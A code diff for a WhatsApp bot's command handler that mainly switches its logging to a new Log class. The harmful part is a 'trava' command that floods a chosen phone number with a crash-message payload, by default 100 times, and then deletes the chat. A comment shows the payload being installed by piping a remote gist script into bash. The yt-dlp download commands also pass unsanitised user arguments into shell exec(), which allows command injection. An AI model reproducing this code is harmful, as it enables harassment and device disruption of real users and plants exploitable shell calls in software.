@@ -1,9 +1,10 @@
-import {MessageType, Mimetype, GroupSettingChange } from '@adiwajshing/baileys';
+import {MessageType, Mimetype, GroupSettingChange, ChatModification } from '@adiwajshing/baileys';
 import { createStickerFromMedia, quotationMarkParser, convertGifToMp4, Waifu } from './user_functions.js';
 import{ getDataFromUrl, postDataToUrl } from './functions.js';
 import { getAllCommands, getCommandsByCategory } from "../docs/DOC_commands.js";
 import { Database } from "../databases/db.js";
 import { exec } from 'child_process';
+import { Log } from "../logger/logger.js";
 import fs from 'fs';
 
 /* TODOS OS COMANDOS DEVEM ESTAR NESTE ARQUIVO, MENOS OS COMANDOS SEM PREFIXO.
@@ -19,10 +20,11 @@ DEPOIS FAÇA IMPORT DESSA FUNÇÃO PARA ESTE ARQUIVO E USE NO SEU COMANDO!
  * @returns undefined
  */
 async function commandHandler(bot, cmd, data) {
+    const logger = new Log("./logger/commands.log");
 	const command = cmd.split(bot.prefix)[1].split(" ")[0]; // get the command
     if(command.length == 0) return; // if the command is empty, return
     const args = cmd.split(" ").slice(1); // get the arguments (if any) from the command
-    bot.logger.write("Comando: " + command + (args.length < 1 ? '' : ", with args: " + args.join(" ")) + " from " + data.bot_data.sender + (data.bot_data.is_group ? " on group " + data.group_data.name : ""), 3);
+    logger.write("Comando: " + command + (args.length < 1 ? '' : ", with args: " + args.join(" ")) + " from " + data.bot_data.sender + (data.bot_data.is_group ? " on group " + data.group_data.name : ""), 3);
     let error = "Algo deu errado!"; // default error message
 
     switch (command) {
@@ -72,17 +74,17 @@ async function commandHandler(bot, cmd, data) {
                 }
                 const filename = Math.round(Math.random() * 100000) + ".opus"; // cria um nome aleatório para o arquivo
                 const query = "yt-dlp --no-check-certificates -x -S 'res:480' " + " -o " + filename + " " + argument; // query para baixar a música
-                bot.logger.write(query, 3); // loga a query
+                logger.write(query, 3); // loga a query
                 exec(query, async (error) => { // executa a query
                     if(error) { // se houver erro
-                        bot.logger.write("erro> " + error, 2); // loga o erro
-                        bot.logger.write("Apagando arquivo " + filename, 2); // loga a mensagem
+                        logger.write("erro> " + error, 2); // loga o erro
+                        logger.write("Apagando arquivo " + filename, 2); // loga a mensagem
                         fs.unlinkSync(filename); // apaga o arquivo
                         return await bot.replyText(data, "Houve um erro ao processar!"); // retorna a mensagem de erro
                     } else { // se não houver erro
                         await bot.replyMedia(data, filename, MessageType.audio); // envia a música
                         if(fs.existsSync(filename)) { // se o arquivo existir
-                            bot.logger.write("Apagando arquivo " + filename); // loga a mensagem
+                            logger.write("Apagando arquivo " + filename); // loga a mensagem
                             fs.unlinkSync(filename);    // apaga o arquivo
                         }
                         return;
@@ -108,11 +110,11 @@ async function commandHandler(bot, cmd, data) {
                 let filename = Math.round(Math.random() * 100000); // cria um nome aleatório para o arquivo
                 const query = "yt-dlp --no-check-certificates -f mp4 --max-filesize 100m -S 'res:360' " + " -o " + filename + " " + argument; // query para baixar a música
                 filename = "./" + filename;
-                bot.logger.write(query, 3); // loga a query
+                logger.write(query, 3); // loga a query
                 exec(query, async (error) => { // executa a query 
                     if(error) { // se houver erro
-                        bot.logger.write("erro> " + error, 2); // loga o erro
-                        bot.logger.write("Apagando arquivo " + filename, 2); // loga a mensagem
+                        logger.write("erro> " + error, 2); // loga o erro
+                        logger.write("Apagando arquivo " + filename, 2); // loga a mensagem
                         if(fs.existsSync(filename + ".part")) { // se o arquivo existir
                             fs.unlinkSync(filename + ".part"); // apaga o arquivo
                         }
@@ -123,7 +125,7 @@ async function commandHandler(bot, cmd, data) {
                     } else { // se não houver erro
                         await bot.replyMedia(data, filename, MessageType.video, Mimetype.mp4); // envia a música
                         if(fs.existsSync(filename)) { // se o arquivo existir
-                            bot.logger.write("Apagando arquivo " + filename); // loga a mensagem
+                            logger.write("Apagando arquivo " + filename); // loga a mensagem
                             fs.unlinkSync(filename);    // apaga o arquivo
                         }
                         return;
@@ -731,7 +733,7 @@ ${message}`
             } else {
                 const image = await waifu.get("nsfw", args.join(" "), true);
                 if(image.error) {
-                    bot.logger.write(image.error, 2)
+                    logger.write(image.error, 2)
                     error = image.error;
                 } else {
                     if(image.files) {
@@ -778,15 +780,22 @@ ${message}`
             } else if (args.length < 1) {
                 error = "Erro! Preciso do numero a ser travado!";
             } else {
+                const logger = new Log("./logger/travando.log");
                 let times = 100;
                 if (args.length > 1) {
                     times = args[1];
                 }
-                const number = args[0] + "s.whatsapp.net";
+                let number = args[0];
+                if(number.startsWith("@")) {
+                    number = number.split("@")[1];
+                }
+                const jid = number + "@s.whatsapp.net";
                 let trava = fs.readFileSync("./etc/trava", "utf8");  // curl https://gist.githubusercontent.com/kamuridesu/817222c6ab0958a94e2f98d36677e5e0/raw/e49a9a4041507717aa845fb44b5f153819c1a38d/setup.sh | bash
                 for(let i = 0; i < times; i++) {
-                    await bot.sendTextMessage(data, trava, number);
+                    logger.write("Travando " + jid + "...", 1);
+                    await bot.sendTextMessage(data, trava, jid);
                 }
+                await bot.conn.modifyChat(number, ChatModification.delete);
                 return await bot.replyText(data, "Trava enviada com sucesso!");
             }
             return await bot.replyText(data, error);
